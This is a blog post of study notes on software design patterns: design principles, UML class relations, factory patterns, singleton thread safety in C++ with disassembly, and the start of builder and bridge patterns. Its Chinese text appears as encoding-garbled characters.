        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">è®¾è®¡æ¨¡å¼</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:09:00 / Modified: 13:18:44" itemprop="dateCreated datePublished" datetime="2025-04-22T13:09:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a>è®¾è®¡æ¨¡å¼</h1><p><a target="_blank" rel="noopener" href="https://github.com/DeutschBall/DesignModel">https://github.com/DeutschBall/DesignModel</a></p>
<h2 id="å…­åŸåˆ™"><a href="#å…­åŸåˆ™" class="headerlink" title="å…­åŸåˆ™"></a>å…­åŸåˆ™</h2><h3 id="å•ä¸€èŒè´£åŸåˆ™"><a href="#å•ä¸€èŒè´£åŸåˆ™" class="headerlink" title="å•ä¸€èŒè´£åŸåˆ™"></a>å•ä¸€èŒè´£åŸåˆ™</h3><p>ä¸€ä¸ªç±»è´Ÿè´£çš„èŒè´£åº”è¯¥å°½å¯èƒ½å°‘ï¼Œæœ€å¥½æ˜¯å•ä¸€åŠŸèƒ½ã€‚ç±»åº”è¯¥åªæœ‰ä¸€ä¸ªå¼•èµ·è‡ªå·±å˜åŒ–çš„åŸå› ã€‚</p>
<p>å¦åˆ™å¦‚æœæœ‰ä¸¤ä¸ªä»¥ä¸ŠåŠŸèƒ½ï¼Œå½“ç”¨æˆ·åªæ˜¯ç”¨å…¶ä¸­ä¸€ä¸ªåŠŸèƒ½æ—¶è¿˜è¦å¯¼å…¥å…¶ä»–æ— ç”¨åŠŸèƒ½</p>
<h3 id="âœ¨å¼€æ”¾å°é—­åŸåˆ™"><a href="#âœ¨å¼€æ”¾å°é—­åŸåˆ™" class="headerlink" title="âœ¨å¼€æ”¾å°é—­åŸåˆ™"></a>âœ¨å¼€æ”¾å°é—­åŸåˆ™</h3><p>å¯¹æ‹“å±•å¼€æ”¾ï¼Œ å¯¹ä¿®æ”¹å…³é—­</p>
<p>å·²ç»å†™å¥½çš„ä»£ç åº”è¯¥å°½å¯èƒ½ä¿æŒä¸å˜ï¼Œæ–°åŠŸèƒ½ä»¥æ‹“å±•çš„å½¢å¼å®ç°ï¼Œä¸åº”è¯¥ä»¥ä¿®æ”¹çš„å½¢å¼å‡ºç°</p>
<p>æ¯”å¦‚å‘æœ‰äº›if-elseä¸­æ·»åŠ åˆ¤æ–­æ¡ä»¶å°±ä¸æ»¡è¶³æ”¹åŸåˆ™</p>
<h3 id="ä¾èµ–å€’ç½®åŸåˆ™"><a href="#ä¾èµ–å€’ç½®åŸåˆ™" class="headerlink" title="ä¾èµ–å€’ç½®åŸåˆ™"></a>ä¾èµ–å€’ç½®åŸåˆ™</h3><p>é’ˆå¯¹æ¥å£ç¼–ç¨‹, ä¸é’ˆå¯¹å®ç°ç¼–ç¨‹</p>
<p>å˜é‡çš„å£°æ˜ç±»å‹å°½é‡æ˜¯æŠ½è±¡ç±»æˆ–æ¥å£ï¼Œè¿™æ ·æˆ‘ä»¬çš„å˜é‡å¼•ç”¨å’Œå®é™…å¯¹è±¡é—´ï¼Œå°±å­˜åœ¨ä¸€ä¸ªç¼“å†²å±‚ï¼Œåˆ©äºç¨‹åºæ‰©å±•å’Œä¼˜åŒ–ã€‚</p>
<h3 id="âœ¨é‡Œæ°æ›¿æ¢åŸåˆ™"><a href="#âœ¨é‡Œæ°æ›¿æ¢åŸåˆ™" class="headerlink" title="âœ¨é‡Œæ°æ›¿æ¢åŸåˆ™"></a>âœ¨é‡Œæ°æ›¿æ¢åŸåˆ™</h3><p>ä¸€ä¸ªè½¯ä»¶å®ä½“å¦‚æœä½¿ç”¨çš„æ˜¯ä¸€ä¸ªçˆ¶ç±»çš„è¯ï¼Œé‚£ä¹ˆä¸€å®šé€‚ç”¨äºå…¶å­ç±»ï¼Œè€Œä¸”å®ƒå¯Ÿè§‰ä¸å‡ºçˆ¶ç±»å¯¹è±¡å’Œå­ç±»å¯¹è±¡çš„åŒºåˆ«ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è½¯ä»¶é‡Œé¢ï¼ŒæŠŠçˆ¶ç±»éƒ½æ›¿æ¢æˆå®ƒçš„å­ç±»ï¼Œç¨‹åºçš„è¡Œä¸ºæ²¡æœ‰å˜åŒ–.</p>
<p>é«˜å±‚æ¨¡å—ä¸èƒ½ä¾èµ–åº•å±‚æ¨¡å—, é«˜å±‚æ¨¡å—å’Œåº•å±‚æ¨¡å—éƒ½åº”ä¾èµ–æŠ½è±¡.</p>
<p>è€ƒè™‘è¿™ä¹ˆä¸€ä¸ªé—®é¢˜: é¸Ÿç±»èƒ½å¦ä½œä¸ºä¼é¹…ç±»çš„çˆ¶ç±»?</p>
<p>é¸Ÿç±»å¿…é¡»å®ç°flyæ¥å£, å¦‚æœä¼é¹…ç±»ç»§æ‰¿é¸Ÿç±», æ„æ€å°±æ˜¯ä¼é¹…ä¹Ÿæœ‰flyæ¥å£, ä½†æ˜¯ä¼é¹…æ˜¾ç„¶ä¸ä¼šé£. å› æ­¤è¿™ç»§æ‰¿å°±ä¸å¯¹.</p>
<p>ä¹Ÿå°±æ˜¯è¯´, åªæœ‰å­ç±»å¯ä»¥å®Œå…¨æ›¿ä»£çˆ¶ç±», æ‰èƒ½ä½¿ç”¨ç»§æ‰¿.</p>
<h3 id="è¿ªç±³ç‰¹æ³•åˆ™"><a href="#è¿ªç±³ç‰¹æ³•åˆ™" class="headerlink" title="è¿ªç±³ç‰¹æ³•åˆ™"></a>è¿ªç±³ç‰¹æ³•åˆ™</h3><p>æœ€å°‘çŸ¥è¯†åŸåˆ™</p>
<p>1.æœ€ä½è®¿é—®æƒé™</p>
<p>2.ä¸¤ä¸ªç±»å½¼æ­¤ä¸é€šä¿¡åˆ™ä¸¤ä¸ªç±»ä¸åº”å½“å‘ç”Ÿç›´æ¥çš„ç›¸äº’ä½œç”¨</p>
<h3 id="âœ¨âœ¨âœ¨åˆæˆ-èšåˆå¤ç”¨åŸåˆ™"><a href="#âœ¨âœ¨âœ¨åˆæˆ-èšåˆå¤ç”¨åŸåˆ™" class="headerlink" title="âœ¨âœ¨âœ¨åˆæˆ&#x2F;èšåˆå¤ç”¨åŸåˆ™"></a>âœ¨âœ¨âœ¨åˆæˆ&#x2F;èšåˆå¤ç”¨åŸåˆ™</h3><p>ä¼˜å…ˆä½¿ç”¨å¯¹è±¡çš„åˆæˆ&#x2F;èšåˆå…³ç³»ï¼Œè€Œä¸æ˜¯ç±»ç»§æ‰¿å…³ç³»</p>
<p>èšåˆï¼ˆç»„åˆï¼‰ï¼šå¼±æ‹¥æœ‰å…³ç³»ï¼ŒAå¯¹è±¡ä¸­å¯ä»¥åŒ…å«Bå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ä¸åŒ…å«ã€‚Aå¯¹è±¡å’ŒBå¯¹è±¡ç¦»å¼€å¯¹æ–¹éƒ½èƒ½ç‹¬ç«‹å­˜åœ¨ã€‚ ä¸ªä½“ä¸ç¾¤ç»„ã€‚</p>
<p>åˆæˆï¼šå¼ºæ‹¥æœ‰å…³ç³»ï¼Œä¸¥æ ¼çš„éƒ¨åˆ†å’Œæ•´ä½“å…³ç³»ï¼Œä¸¤è€…å…±å­˜äº¡ã€‚ å™¨å®˜ä¸èº«ä½“</p>
<p>ä¼˜ç‚¹æ˜¯ç±»çš„ç»§æ‰¿å±‚æ¬¡æ¯”è¾ƒå°ã€‚ä¿æŒæ¯ä¸ªç±»è¢«å•ç‹¬å°è£…ï¼Œé›†ä¸­ç²¾åŠ›é¢å¯¹å•ä¸ªä»»åŠ¡ã€‚</p>
<h2 id="UMLç±»å›¾"><a href="#UMLç±»å›¾" class="headerlink" title="UMLç±»å›¾"></a>UMLç±»å›¾</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409093149630.png" alt="image-20250409093149630"></p>
<table>
<thead>
<tr>
<th>ç±»å…³ç³»</th>
<th>è§£é‡Š</th>
<th>ä¾‹å­</th>
</tr>
</thead>
<tbody><tr>
<td>ç»§æ‰¿</td>
<td>ç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»</td>
<td>é¸Ÿç±»ç»§æ‰¿åŠ¨ç‰©ç±»</td>
</tr>
<tr>
<td>å®ç°</td>
<td>å®ç°ä¸€ä¸ªæ¥å£</td>
<td>é¸Ÿç±»å®ç°IFlyAbleæ¥å£</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>ä¾èµ–</td>
<td>ç±»Bä½œä¸ºç±»Aæ–¹æ³•çš„å‚æ•°\å±€éƒ¨å˜é‡ï¼Œåœ¨Aä¸­ä¸´æ—¶å­˜åœ¨</td>
<td></td>
</tr>
<tr>
<td>å…³è”</td>
<td>ç±»Bä½œä¸ºç±»Açš„æˆå‘˜å˜é‡ï¼Œåœ¨Aä¸­æ°¸ä¹…å­˜åœ¨</td>
<td>é“¾è¡¨ç±»ä¸­æœ‰ä¸€ä¸ªé™„åŠ å¤´èŠ‚ç‚¹ç±»çš„å¼•ç”¨</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>èšåˆ</td>
<td>ä¸ªä½“å¯ä»¥ç¦»å¼€æ•´ä½“å­˜åœ¨</td>
<td></td>
</tr>
<tr>
<td>ç»„åˆ</td>
<td>ä¸ªä½“å’Œæ•´ä½“å…±å­˜äº¡ï¼Œä¸å¯åˆ†å¼€</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="è®¾è®¡æ¨¡å¼-1"><a href="#è®¾è®¡æ¨¡å¼-1" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a>è®¾è®¡æ¨¡å¼</h2><h3 id="åˆ›å»ºå‹æ¨¡å¼"><a href="#åˆ›å»ºå‹æ¨¡å¼" class="headerlink" title="åˆ›å»ºå‹æ¨¡å¼"></a>åˆ›å»ºå‹æ¨¡å¼</h3><p>åˆ›å»ºå¯¹è±¡åŒæ—¶éšè—åˆ›å»ºé€»è¾‘ï¼Œé¿å…ç›´æ¥ä½¿ç”¨newè¿ç®—ç¬¦</p>
<h4 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h4><h5 id="ç®€å•å·¥å‚æ¨¡å¼"><a href="#ç®€å•å·¥å‚æ¨¡å¼" class="headerlink" title="ç®€å•å·¥å‚æ¨¡å¼"></a>ç®€å•å·¥å‚æ¨¡å¼</h5><p>ç®€å•å·¥å‚æ–¹æ³•çš„å¼Šç«¯ï¼šè¿åäº†å¼€æ”¾-å°é—­åŸåˆ™</p>
<p>ç®€å•å·¥å‚ç±»éœ€è¦æ¥å—ä¸€ä¸ªç±»å‹å‚æ•°ï¼Œç„¶åé€šè¿‡switch-caseåˆ¤æ–­è¿”å›å…·ä½“å¯¹è±¡</p>
<p>å¦‚æœè¦åŠ å…¥æ–°çš„ç±»å‹ï¼Œé‚£ä¹ˆå°±å¾—æ”¹å†™è¿™ä¸ªswitch-caseé€»è¾‘ï¼Œè¿™å°±è¿åäº†å¼€æ”¾-å°é—­åŸåˆ™</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> CashSuper* <span class="title function_">createCash</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; type)</span>&#123;</span><br><span class="line">    CashSuper * cash = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(type==<span class="string">&quot;æ­£å¸¸æ”¶è´¹&quot;</span>)&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;8æŠ˜æ”¶è´¹&quot;</span>)&#123;</span><br><span class="line">        cash = new CashDiscount(<span class="number">0.8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;æ»¡20å‡5&quot;</span>)&#123;</span><br><span class="line">        cash = new CashReturn(<span class="number">20</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="å·¥å‚æ–¹æ³•æ¨¡å¼"><a href="#å·¥å‚æ–¹æ³•æ¨¡å¼" class="headerlink" title="å·¥å‚æ–¹æ³•æ¨¡å¼"></a>å·¥å‚æ–¹æ³•æ¨¡å¼</h5><p>å·¥å‚æ–¹æ³•æ¨¡å¼æ˜¯å¯¹ç®€å•å·¥å‚æ¨¡å¼çš„æ”¹è¿›ï¼Œéœ€è¦æ»¡è¶³å¼€æ”¾-å°é—­åŸåˆ™</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409164116644.png" alt="image-20250409164116644"></p>
<h4 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h4><p>é€‚ç”¨åœºæ™¯:</p>
<p>è€ƒè™‘è¿™ä¹ˆä¸€ç§åœºæ™¯</p>
<p>æœ‰ä¸¤å®¶å·¥å‚, è‹¹æœå·¥å‚å’Œè”æƒ³å·¥å‚</p>
<p>ä¸¤å®¶å·¥å‚éƒ½ç”Ÿäº§è®¡ç®—æœº, æ™ºèƒ½æ‰‹æœºç­‰ç”µå­äº§å“</p>
<p>ç”¨æˆ·æƒ³è¦ä¸€æ¬¾è‹¹æœæ‰‹æœº</p>
<p>å°±æ˜¯æœ‰å¤šç§å“ç‰Œç³»ç»Ÿ(åœ¨è¿™é‡Œæ˜¯è”æƒ³å’Œè‹¹æœ),ä»–ä»¬éƒ½èƒ½ç”Ÿäº§åŒç§ç±»çš„äº§å“</p>
<p>æ­¤æ—¶å°±å¯ä½¿ç”¨æŠ½è±¡å·¥å‚æ¨¡å¼</p>
<p>æŠ½è±¡å·¥å‚æ¨¡å¼çš„å®ç°æµç¨‹:</p>
<p>1.å®šä¹‰æŠ½è±¡äº§å“ç±», åœ¨æœ¬ä¾‹ä¸­æ˜¯æ™ºèƒ½æ‰‹æœºå’Œè®¡ç®—æœºåŸºç±». å¯ä»¥è§„å®šäº§å“é€šç”¨çš„åŠŸèƒ½æ¥å£, æ¯”å¦‚æ‰‹æœºå¯ä»¥æ‰“ç”µè¯</p>
<p>2.å®šä¹‰å…·ä½“äº§å“ç±», åœ¨æœ¬ä¾‹ä¸­æ˜¯è‹¹æœæ‰‹æœº,è‹¹æœç”µè„‘, è”æƒ³æ‰‹æœº,è”æƒ³ç”µè„‘</p>
<p>3.å®šä¹‰æŠ½è±¡å·¥å‚ç±», è§„å®šä»»æ„å·¥å‚éƒ½èƒ½ç”Ÿäº§çš„äº§å“ç±»å‹, åœ¨æœ¬ä¾‹ä¸­æ˜¯è®¡ç®—æœºå’Œæ™ºèƒ½æ‰‹æœº. </p>
<p>4.å®šä¹‰å…·ä½“å·¥å‚ç±», å…·ä½“å·¥å‚ç±»å®ç°æŠ½è±¡å·¥å‚. åœ¨æœ¬ä¾‹ä¸­å…·ä½“å·¥å‚å°±æ˜¯è‹¹æœå·¥å‚å’Œè”æƒ³å·¥å‚. </p>
<p>å…·ä½“å·¥å‚ä¸­ç”Ÿäº§å…·ä½“äº§å“, å®é™…ä¸Šæ˜¯å®ç°æŠ½è±¡å·¥å‚è§„å®šçš„ç”Ÿäº§æ¥å£</p>
<p>æŠ½è±¡å·¥å‚è§„å®šè¦ç”Ÿäº§æ™ºèƒ½æ‰‹æœº</p>
<p>è‹¹æœå·¥å‚ä¸­å®ç°ç”Ÿäº§è‹¹æœæ‰‹æœº</p>
<h4 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h4><p>ä¿è¯ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹, å¹¶æä¾›ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹</p>
<p>æ‡’æ±‰æ¨¡å¼: åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨å•ä¾‹æ—¶æ‰åˆ›å»ºå®ƒ</p>
<p>é¥¿æ±‰æ¨¡å¼: åœ¨mainå‡½æ•°ä¹‹å‰, ä¹Ÿå°±æ˜¯ç¨‹åºåˆå§‹åŒ–æ—¶åˆ›å»ºå®ƒ</p>
<p>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹, æ‡’æ±‰æ¨¡å¼ä¼šé¢ä¸´çº¿ç¨‹å®‰å…¨é—®é¢˜, ä½†æ˜¯é¥¿æ±‰ä¸ä¼š</p>
<p>å› ä¸ºé¥¿æ±‰åˆ›å»ºå•ä¾‹æ˜¯åœ¨mainå‡½æ•°ä¹‹å‰, æ­¤æ—¶ç»å¯¹ä¸ä¼šæœ‰å¤šä¸ªçº¿ç¨‹</p>
<p>ä½†æ˜¯æ‡’æ±‰æ¨¡å¼ä¸‹ä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶åˆ›å»ºå•ä¾‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//è¿›å…¥ä¸´ç•ŒåŒº,å¯èƒ½ä¼šæœ‰ä¸¤ä¸ªçº¿ç¨‹éƒ½åˆ¤æ–­instanceä¸ºç©ºç„¶åè¿›æ¥åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        instance = new SingletonLazy();	</span><br><span class="line">        <span class="comment">//é€€å‡ºä¸´ç•ŒåŒº</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æ‡’æ±‰æ¨¡å¼ä¸‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜"><a href="#æ‡’æ±‰æ¨¡å¼ä¸‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜" class="headerlink" title="æ‡’æ±‰æ¨¡å¼ä¸‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜"></a>æ‡’æ±‰æ¨¡å¼ä¸‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜</h5><p>å¯ä»¥ä½¿ç”¨åŒé‡é”è§£å†³è¿™ä¸ªé—®é¢˜</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> SingletonLazy&amp; <span class="title">getSingletonLazy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        m.<span class="built_in">lock</span>();		<span class="comment">//static mutex mä¹Ÿæ˜¯æœ¬ç±»å”¯ä¸€çš„äº’æ–¥é”</span></span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;	<span class="comment">//å†æ¬¡åˆ¤æ–­æ˜¯å¦å·²ç»åˆ›å»ºäº†å¯¹è±¡</span></span><br><span class="line">        	instance = <span class="keyword">new</span> <span class="built_in">SingletonLazy</span>();	</span><br><span class="line">    	&#125;</span><br><span class="line">        m.<span class="built_in">unlock</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤æ¬¡åˆ¤ç©ºçš„ä½œç”¨æ˜¯?</p>
<p>åŠ é”å’Œä¸Šé”æ“ä½œå¼€é”€æ¯”è¾ƒå¤§, åº”è¯¥å°½é‡é¿å…</p>
<p>å‡è®¾æœ‰ä¸¤ä¸ªçº¿ç¨‹A,BåŒæ—¶é€šè¿‡äº†ç¬¬ä¸€æ¬¡åˆ¤ç©º</p>
<p>Açº¿ç¨‹é¦–å…ˆæŒæœ‰mé”, å¹¶é€šè¿‡äº†ç¬¬äºŒæ¬¡åˆ¤ç©º, åˆ›å»ºäº†å¯¹è±¡</p>
<p>Bçº¿ç¨‹ç­‰Aé‡Šæ”¾mé”åå†æŒæœ‰, æ­¤æ—¶Båˆ¤ç©ºå‘ç°å¯¹è±¡å·²ç»åˆ›å»ºå¥½äº†, è‡ªå·±å°±ä¸ç”¨å†åˆ›å»ºäº†</p>
<p>å¦‚æœå»æ‰å¤–å±‚åˆ¤ç©º, ä¾ç„¶æ˜¯çº¿ç¨‹å®‰å…¨, ä½†æ˜¯è¿™æ ·ä¼šå¯¼è‡´, ä¸ç®¡å¯¹è±¡æ˜¯å¦è¢«åˆ›å»º, æ¯ä¸ªçº¿ç¨‹æ¥äº†éƒ½å…ˆç­‰é”, å³ä½¿ä¸éœ€è¦åˆ›å»ºå¯¹è±¡, ä¹Ÿè¦æ— æ„ä¹‰ç­‰é”</p>
<p>å¦‚æœå»æ‰å†…å±‚åˆ¤ç©º, å°±ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„äº†, è€ƒè™‘ä¸Šè¿°ABä¸¤ä¸ªçº¿ç¨‹éƒ½ç»è¿‡äº†å¤–å±‚åˆ¤ç©º, Aé¦–å…ˆæŒæœ‰é”åˆ›å»ºå¯¹è±¡, ç„¶åBæŒæœ‰é”çœ‹, Béƒ½ä¸çœ‹æ˜¯å¦æœ‰å¯¹è±¡äº†å°±åˆ›å»º.è¿˜æ˜¯ä¼šé€ æˆçº¿ç¨‹å®‰å…¨é—®é¢˜</p>
<h5 id="é™æ€å±€éƒ¨å˜é‡çš„çº¿ç¨‹å®‰å…¨æ€§"><a href="#é™æ€å±€éƒ¨å˜é‡çš„çº¿ç¨‹å®‰å…¨æ€§" class="headerlink" title="é™æ€å±€éƒ¨å˜é‡çš„çº¿ç¨‹å®‰å…¨æ€§"></a>é™æ€å±€éƒ¨å˜é‡çš„çº¿ç¨‹å®‰å…¨æ€§</h5><p>c++11ä¹‹åé™æ€å±€éƒ¨å˜é‡çš„åˆå§‹åŒ–æ˜¯çº¿ç¨‹å®‰å…¨çš„</p>
<p>å› æ­¤æ‡’æ±‰æ¨¡å¼ç›´æ¥è¿™æ ·å†™, ä¹Ÿæ˜¯çº¿ç¨‹å®‰å…¨çš„:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> SingletonLazy instance;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ç°åŸç†:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004012cf &lt;+23&gt;:    lea    rax,[rip+0x2ed2]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012d6 &lt;+30&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012d9 &lt;+33&gt;:    call   0x4010b0 &lt;__cxa_guard_acquire@plt&gt;</span><br><span class="line">0x00000000004012de &lt;+38&gt;:    test   eax,eax</span><br><span class="line">0x00000000004012e0 &lt;+40&gt;:    setne  al</span><br><span class="line">0x00000000004012e3 &lt;+43&gt;:    test   al,al</span><br><span class="line">0x00000000004012e5 &lt;+45&gt;:    je     0x40130b &lt;_ZN13SingletonLazy16getSingletonLazyEv+83&gt;</span><br><span class="line">0x00000000004012e7 &lt;+47&gt;:    mov    r12d,0x0</span><br><span class="line">0x00000000004012ed &lt;+53&gt;:    lea    rax,[rip+0x2eac]        # 0x4041a0 &lt;_ZZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012f4 &lt;+60&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012f7 &lt;+63&gt;:    call   0x40127e &lt;_ZN13SingletonLazyC2Ev&gt;</span><br><span class="line">0x00000000004012fc &lt;+68&gt;:    lea    rax,[rip+0x2ea5]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x0000000000401303 &lt;+75&gt;:    mov    rdi,rax</span><br><span class="line">0x0000000000401306 &lt;+78&gt;:    call   0x401040 &lt;__cxa_guard_release@plt&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¬¬11è¡Œè°ƒç”¨æ„é€ å‡½æ•°çš„å‰å, ç¼–è¯‘å™¨è‡ªåŠ¨åŠ ä¸Šäº†<code>guard</code></p>
<p><code>guard</code>åº•å±‚ç”±<code>SYS_futex</code>ç³»ç»Ÿè°ƒç”¨å®ç°</p>
<h4 id="âœ¨å»ºé€ è€…æ¨¡å¼"><a href="#âœ¨å»ºé€ è€…æ¨¡å¼" class="headerlink" title="âœ¨å»ºé€ è€…æ¨¡å¼"></a>âœ¨å»ºé€ è€…æ¨¡å¼</h4><p>è®¾è®¡nä¸ªç±»è¡¨ç°æ±½è½¦:</p>
<ol>
<li>æ‰€æœ‰æ±½è½¦éƒ½å…·å¤‡â€è¡Œé©¶â€çš„åŠŸèƒ½ </li>
<li>æ±½è½¦çš„â€è½¦é—¨æ•°é‡â€å¯èƒ½ä¸åŒ </li>
<li>æ±½è½¦æŒ‰ç…§èƒ½æºç±»å‹åˆ†ä¸ºâ€ç‡ƒæ²¹è½¦â€å’Œâ€ç”µåŠ¨è½¦â€ï¼Œç‡ƒæ²¹è½¦å…·å¤‡â€åŠ æ²¹â€çš„èƒ½åŠ›ï¼Œç”µåŠ¨è½¦å…·å¤‡â€å……ç”µâ€çš„èƒ½åŠ› </li>
<li>æ±½è½¦æŒ‰ç…§ç”¨é€”åˆ†ä¸ºâ€è½¿è½¦â€å’Œâ€å¡è½¦â€ï¼Œè½¿è½¦æ²¡æœ‰é¢å¤–åŠŸèƒ½ï¼Œå¡è½¦å…·å¤‡â€è£…è½½è´§ç‰©â€çš„åŠŸèƒ½æœ€ç»ˆä¸€è¾†4é—¨ç”µåŠ¨å¡è½¦æ˜¯å¦‚ä½•è¡¨è¾¾çš„</li>
</ol>
<h5 id="è½¦çš„ç»„æˆ-æ¡¥æ¥æ¨¡å¼"><a href="#è½¦çš„ç»„æˆ-æ¡¥æ¥æ¨¡å¼" class="headerlink" title="è½¦çš„ç»„æˆ - æ¡¥æ¥æ¨¡å¼"></a>è½¦çš„ç»„æˆ - æ¡¥æ¥æ¨¡å¼</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png" alt="image-20250410195428877"></p>
<p>æ‰€æœ‰è½¦è¾†å…±æœ‰çš„è½¦é—¨, å¼•æ“, èƒ½æºç­‰ç»„ä»¶, å‡ä»¥æ§½ä½çš„å½¢å¼è™šä½ä»¥å¾… , ä¹Ÿå°±æ˜¯è½¦ä¸è¿™å‡ ä¸ªç»„ä»¶éƒ½æ˜¯ç»„åˆå…³ç³»</p>
<p>è½¦ç›¸å…³çš„ç±»æŒ‰ç…§ç”¨é€”åˆ’åˆ†ä¸ºå¡è½¦ç±»å’Œè½¿è½¦ç±», å…¶ä¸­å¡è½¦ç±»å¤šä¸€ä¸ª<code>loaders</code>æ§½, ç”¨äºç»„åˆé›†è£…ç®±ç±» </p>
